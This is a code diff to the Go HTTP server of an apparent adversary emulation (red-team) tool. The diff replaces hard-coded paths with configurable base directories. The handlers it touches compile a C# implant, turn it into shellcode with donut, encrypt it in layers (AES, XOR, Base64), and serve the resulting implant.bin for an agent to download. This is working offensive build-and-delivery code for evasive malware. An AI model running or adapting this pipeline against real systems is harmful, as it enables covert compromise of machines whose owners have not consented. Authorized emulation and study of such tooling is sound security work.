@@ -14,13 +14,20 @@ import (
 )
 
 func generateImplant(w http.ResponseWriter, r *http.Request) {
+	config, e := LoadConfiguration("aef-profile.json")
+	if e != nil {
+		log.Fatal("Error loading profile")
+	}
+	basedirwin := config[0].BasedirWin
+	basedirlin := config[0].BasedirLin
+
 	var cmd *exec.Cmd
 	fmt.Println("Hit, generating shellcode...")
-	// fmt.Println("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\Implant.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Implant.cs F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Modules\\ExecuteAssembly.cs && F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\donut.exe -a 2 --input:F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\Implant.exe --output:F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\implant.bin")
+	fmt.Println("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:" + basedirwin + "donut\\Implant.exe " + basedirwin + "Implant\\Implant.cs " + basedirwin + "Implant\\Modules\\ExecuteAssembly.cs " + basedirwin + "Implant\\Modules\\Commands.cs " + basedirwin + "Implant\\Modules\\CompileAndRunNET.cs && " + basedirwin + "donut\\donut.exe -a 2 --input:" + basedirwin + "donut\\Implant.exe --output:" + basedirwin + "Encryption\\implant.bin")
 	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd", "/c", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\Implant.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Implant.cs F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Modules\\ExecuteAssembly.cs F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Modules\\Commands.cs F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Modules\\CompileAndRunNET.cs && F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\donut.exe -a 2 --input:F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\Implant.exe --output:F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\implant.bin")
+		cmd = exec.Command("cmd", "/c", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:"+basedirwin+"donut\\Implant.exe "+basedirwin+"Implant\\Implant.cs "+basedirwin+"Implant\\Modules\\ExecuteAssembly.cs "+basedirwin+"Implant\\Modules\\Commands.cs "+basedirwin+"Implant\\Modules\\CompileAndRunNET.cs && "+basedirwin+"donut\\donut.exe -a 2 --input:"+basedirwin+"donut\\Implant.exe --output:"+basedirwin+"Encryption\\implant.bin")
 	} else {
-		cmd = exec.Command("/bin/sh", "-c", "mcs -out:/tmp/Implant.exe /mnt/f/capstone-adversary-emulation-tool/Implementation/Implant/Implant.cs && /mnt/f/capstone-adversary-emulation-tool/Implementation/donut/donut --input:/tmp/Implant.exe --output:/tmp/implant.bin")
+		cmd = exec.Command("/bin/sh", "-c", "mcs -out:/tmp/Implant.exe "+basedirlin+"Implant/Implant.cs && /mnt/f/capstone-adversary-emulation-tool/Implementation/donut/donut --input:/tmp/Implant.exe --output:/tmp/implant.bin")
 	}
 
 	err := cmd.Run()
@@ -30,9 +37,9 @@ func generateImplant(w http.ResponseWriter, r *http.Request) {
 	}
 
 	fmt.Println("Encrypting the Shellcode with: AES-256 -> XOR -> Base64")
-	// fmt.Println("python F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\Cryptocutter.py -f F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\implant.bin -o F:\\capstone-adversary-emulation-tool\\Implementation\\OutputShellcode\\implant.bin")
+	fmt.Println("python " + basedirwin + "Encryption\\Cryptocutter.py -f " + basedirwin + "Encryption\\implant.bin -o " + basedirwin + "OutputShellcode\\implant.bin")
 	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd", "/c", "python F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\Cryptocutter.py -f F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\implant.bin -o F:\\capstone-adversary-emulation-tool\\Implementation\\OutputShellcode\\implant.bin")
+		cmd = exec.Command("cmd", "/c", "python "+basedirwin+"Encryption\\Cryptocutter.py -f "+basedirwin+"Encryption\\implant.bin -o "+basedirwin+"OutputShellcode\\implant.bin")
 	} else {
 		cmd = exec.Command("")
 	}
@@ -83,13 +90,9 @@ func generateImplant(w http.ResponseWriter, r *http.Request) {
 	io.Copy(w, file)
 }
 
-type Agent struct {
-	Code string `json:"Code"`
-}
-
 func windowsImplant(w http.ResponseWriter, r *http.Request) {
 	fmt.Println("Agent getting downloaded")
-	filepath := "F:\\capstone-adversary-emulation-tool\\Implementation\\OutputShellcode\\implant.bin"
+	filepath := "..\\OutputShellcode\\implant.bin"
 	if _, err := os.Stat(filepath); os.IsNotExist(err) {
 		fmt.Println("File does not exist:", err)
 		http.Error(w, "File not found.", http.StatusNotFound)
